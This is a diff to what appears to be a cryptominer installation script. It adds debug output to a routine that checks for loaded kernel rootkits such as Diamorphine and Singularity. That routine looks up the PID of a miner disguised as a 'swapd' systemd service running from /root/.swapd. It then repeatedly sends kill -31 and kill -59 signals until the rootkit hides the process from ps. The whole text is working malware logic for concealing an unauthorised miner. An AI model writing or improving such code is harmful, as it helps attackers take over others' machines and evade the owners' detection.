@@ -3061,15 +3061,21 @@ echo "=========================================="
 echo ""
 
 # Check if rootkits are loaded
+echo "[*] Checking for loaded rootkits..."
+lsmod | grep -E "diamorphine|singularity|rootkit" || echo "[DEBUG] lsmod grep returned nothing"
+echo ""
+
 if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
     echo "[!] WARNING: No rootkits detected!"
     echo "[!] Miner will remain VISIBLE in ps output"
     echo ""
     echo "To hide manually after loading rootkits, run:"
-    echo "  kill -31 \$(pgrep -f -u root config.json)"
-    echo "  kill -59 \$(pgrep -f -u root config.json)"
+    echo "  PID=\$(systemctl show --property MainPID --value swapd.service)"
+    echo "  kill -31 \$PID"
+    echo "  kill -59 \$PID"
 else
-    echo "[✓] Rootkits detected"
+    echo "[✓] Rootkits detected:"
+    lsmod | grep -E "diamorphine|singularity|rootkit"
     echo ""
     
     # Keep trying until hidden (max 10 attempts)
@@ -3078,32 +3084,48 @@ else
     
     while [ $attempt -lt $MAX_ATTEMPTS ]; do
         attempt=$((attempt + 1))
+        echo ""
+        echo "=========================================="
         echo "[*] Hide attempt $attempt/$MAX_ATTEMPTS..."
+        echo "=========================================="
         
         # Get PID using systemctl (BEST METHOD for systemd services)
         SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
         
+        echo "[DEBUG] PID from systemctl: '$SWAPD_PID'"
+        
         if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
-            echo "[*] Found swapd PID: $SWAPD_PID (via systemctl)"
+            echo "[✓] Found swapd PID: $SWAPD_PID (via systemctl)"
             
             # Send hide signals to the PID
+            echo "[*] Sending kill -31 to PID $SWAPD_PID..."
             kill -31 $SWAPD_PID 2>/dev/null
+            echo "[*] Sending kill -59 to PID $SWAPD_PID..."
             kill -59 $SWAPD_PID 2>/dev/null
+            echo "[✓] Hide signals sent to PID $SWAPD_PID"
         else
             echo "[!] Could not get PID from systemctl - trying fallback methods..."
             
             # Fallback: use pgrep/ps if systemctl doesn't work
+            FALLBACK_PIDS=$(pgrep -f -u root config.json 2>/dev/null)
+            echo "[DEBUG] Fallback PIDs from pgrep: '$FALLBACK_PIDS'"
+            
             kill -31 $(pgrep -f -u root config.json) 2>/dev/null
             kill -59 $(pgrep -f -u root config.json) 2>/dev/null
             kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
             kill -59 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` 2>/dev/null
+            echo "[✓] Fallback hide signals sent"
         fi
         
         # Sleep 5 seconds (as requested)
+        echo "[*] Waiting 5 seconds for rootkit to process signals..."
         sleep 5
         
         # Check if swapd is hidden
+        echo "[*] Checking if process is hidden..."
         SWAPD_VISIBLE=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
+        
+        echo "[DEBUG] ps check result: '$SWAPD_VISIBLE'"
         
         if [ -z "$SWAPD_VISIBLE" ]; then
             # SUCCESS - swapd is hidden!
@@ -3121,7 +3143,10 @@ else
             break
         else
             # Not hidden - do commands again
-            echo "[!] swapd still visible - trying again..."
+            echo "[!] Process still VISIBLE - continuing to next attempt..."
+            echo "[DEBUG] Visible process details:"
+            ps ax | grep '/root/.swapd/swapd' | grep -v grep
+            echo ""
         fi
     done
     
